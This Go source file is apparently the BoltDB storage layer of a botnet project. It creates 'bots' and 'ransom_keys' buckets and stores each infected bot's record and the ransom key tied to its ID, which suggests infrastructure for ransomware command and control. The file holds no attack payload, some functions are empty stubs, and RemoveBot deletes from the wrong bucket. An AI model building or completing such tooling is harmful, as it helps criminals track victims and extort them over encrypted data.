package bolt

import (
	"os"

	"github.com/boltdb/bolt"
	"github.com/rodzzlessa24/botnet"
)

//Client i
type Client struct {
	DB *bolt.DB
}

//Open is
func Open(path string, mode os.FileMode, options *bolt.Options) (*bolt.DB, error) {
	return bolt.Open(path, mode, options)
}

//CreateBuckets is
func (c *Client) CreateBuckets() error {
	return c.DB.Update(func(tx *bolt.Tx) error {
		if _, err := tx.CreateBucketIfNotExists([]byte("ransom_keys")); err != nil {
			return err
		}
		if _, err := tx.CreateBucketIfNotExists([]byte("bots")); err != nil {
			return err
		}
		return nil
	})
}

//AddBot is
func (c *Client) AddBot(b *botnet.Bot) (*botnet.Bot, error) {
	if err := c.DB.Update(func(tx *bolt.Tx) error {
		bu := tx.Bucket([]byte("bots"))
		by, err := botnet.Bytes(b)
		if err != nil {
			return err
		}
		return bu.Put(b.ID, by)
	}); err != nil {
		return nil, err
	}
	return b, nil
}

//AddRansomKey is
func (c *Client) AddRansomKey(botID, key []byte) error {
	return c.DB.Update(func(tx *bolt.Tx) error {
		bu := tx.Bucket([]byte("ransom_keys"))
		return bu.Put(botID, key)
	})
}

//RemoveBot is
func (c *Client) RemoveBot(id []byte) error {
	return c.DB.Update(func(tx *bolt.Tx) error {
		bu := tx.Bucket([]byte("ransom_keys"))
		return bu.Delete(id)
	})
}

//ListBots is
func (c *Client) ListBots() ([]*botnet.Bot, error) {
	return nil, nil
}

//GetBot is
func (c *Client) GetBot(id []byte) (*botnet.Bot, error) {
	return nil, nil
}
